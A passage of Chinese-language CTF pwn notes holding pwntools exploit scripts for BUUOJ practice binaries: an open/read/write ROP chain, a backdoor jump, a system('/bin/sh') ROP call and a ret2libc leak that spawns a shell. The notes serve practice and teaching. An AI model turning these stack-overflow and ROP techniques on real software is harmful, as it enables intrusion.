# canary = int(sh.recv(16), 16)
# print('canary = '+hex(canary))

sh.recvuntil('?')
sh.send('aa')

# 思路就是在栈溢出的时候控制rip指向read函数，将"flag"字符串读到bss段去，然后再open('flag')+read(3,bss,0x100)+write(1，bss，0x100)
# pop_rsi_r15_ret 也可以进行传参，虽然r15不是要求得rdx,但是没问题，省的去libc再gadget找偏移
payload = padding
payload += p64(pop_rdi_ret_addr) + p64(0)
payload += p64(pop_rsi_r15_ret_addr) + p64(bss_addr) + p64(0x100) + p64(libc.sym['read'])
# p64(0) 为了两个pop传参数，0 open代表只读
payload += p64(pop_rdi_ret_addr) + p64(bss_addr) + p64(pop_rsi_r15_ret_addr) + p64(0) + p64(0) + p64(libc.sym['open'])
# read 第一个参数3好像是读取交互输入
payload += p64(pop_rdi_ret_addr) + p64(3) + p64(pop_rsi_r15_ret_addr) + p64(bss_addr) + p64(0x100) + p64(libc.sym['read'])
payload += p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_r15_ret_addr) + p64(bss_addr) + p64(0x100) + p64(libc.sym['write'])

# # pop_rdx_rsi_ret_addr得注意传参顺序要相反
# payload = padding
# payload += p64(pop_rdi_ret_addr) + p64(0)
# payload += p64(pop_rdx_rsi_ret_addr) + p64(0x100) + p64(bss_addr) + p64(libc.sym['read'])
# # p64(0) 为了两个pop传参数，0 open代表只读
# payload += p64(pop_rdi_ret_addr) + p64(bss_addr) 
# payload += p64(pop_rdx_rsi_ret_addr) + p64(0) + p64(0) + p64(libc.sym['open'])
# # read
# payload += p64(pop_rdi_ret_addr) + p64(3) 
# payload += p64(pop_rdx_rsi_ret_addr) + p64(0x100) + p64(bss_addr) + p64(libc.sym['read'])
# # write
# payload += p64(pop_rdi_ret_addr) + p64(1)
# payload += p64(pop_rdx_rsi_ret_addr) + p64(0x100) + p64(bss_addr) + p64(libc.sym['write'])

sh.recvuntil("?")
sh.send(payload)
sh.send('flag\x00\x00\x00\x00')
sh.interactive()
```

## 简单的输入读取长度，然后栈溢出，注意题目有时进行强制类型转换，存在整数溢出的情况。可以尝试传 '-1' 达到最大

```python
#coding=utf8
from pwn import *

context.log_level = 'debug'

local = 0
proc_name = './bjdctf_2020_babystack'

backdoor_addr = 0x004006E6

if local:
    sh = process(proc_name)
else:
    sh = remote('node3.buuoj.cn', 28972)

# scanf输入数字30
sh.sendlineafter('name:\n', '30')
payload = 0x10 * 'a' + 0x8 * 'b' + p64(backdoor_addr)
sh.sendafter('name?\n', payload)
sh.interactive()
```

## 简单的rop链构造，存在system函数和/bin/sh字符串。远程连接后，需要进行全局查找flag文件 find / -name 'flag'

```python
#coding:utf-8
from pwn import*

proc_name = './babyrop'
sh = remote('node3.buuoj.cn', 27515)
elf = ELF(proc_name)

system_addr = elf.plt['system']
str_binsh_addr = 0x601048
pop_rdi_ret_addr = 0x400683

payload = 0x10 * 'a' + 0x8 * 'b' + p64(pop_rdi_ret_addr) + p64(str_binsh_addr) + p64(system_addr)

sh.sendlineafter('name?', payload)

sh.interactive()
```

## ret2libc，泄露read的got表地址。 神奇的是不能泄露printf的got表???，全局查找flag文件，不过好像一般都在home目录下

```python
#coding:utf-8
from pwn import*

# context.log_level = 'debug'

# sh = process('./babyrop2')
sh = remote('node3.buuoj.cn', 27560)
elf = ELF('./babyrop2')
libc = ELF('./libc.so.6')

main_addr = 0x400636
pop_rdi_ret_addr = 0x0400733

# 这边选择泄露printf的got表地址，算libc不行，很奇怪??????
payload = 0x20 * 'a' + 0x8 * 'b' + p64(pop_rdi_ret_addr) + p64(elf.got['read']) + p64(elf.plt['printf']) + p64(main_addr)
sh.sendafter('name?', payload)

# read读取后，还进行printf，需要先过滤一下这一句在进行读取got表地址
# sh.recvuntil('\n')
# read_addr = u64(sh.recv(6).ljust(8,"\x00"))

# 一句话搞定解码
read_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print(hex(read_addr))

libc_addr = read_addr - libc.symbols['read']
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + libc.search('/bin/sh\0').next()

payload = 0x20 * 'a' + 0x8 * 'b' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
sh.sendafter('name?', payload)

sh.interactive()
```
